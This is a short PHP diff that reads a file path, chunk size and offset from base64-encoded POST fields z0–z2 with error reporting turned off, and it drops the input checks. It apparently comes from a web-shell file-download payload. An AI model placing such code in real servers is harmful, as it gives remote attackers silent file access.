@@ -6,9 +6,9 @@ error_reporting(0);
 
 function main()
 {
-    $szPath = isset($_POST['z0']) ? base64_decode($_POST['z0']) : '';
-    $szChunkSize = isset($_POST['z1']) ? base64_decode($_POST['z1']) : '0';
-    $szOffset = isset($_POST['z2']) ? base64_decode($_POST['z2']) : '0';
+    $szPath = base64_decode($_POST['z0']);
+    $szChunkSize = base64_decode($_POST['z1']);
+    $szOffset = base64_decode($_POST['z2']);
 
     $nChunkSize = (float)$szChunkSize;
     $nOffset = (float)$szOffset;
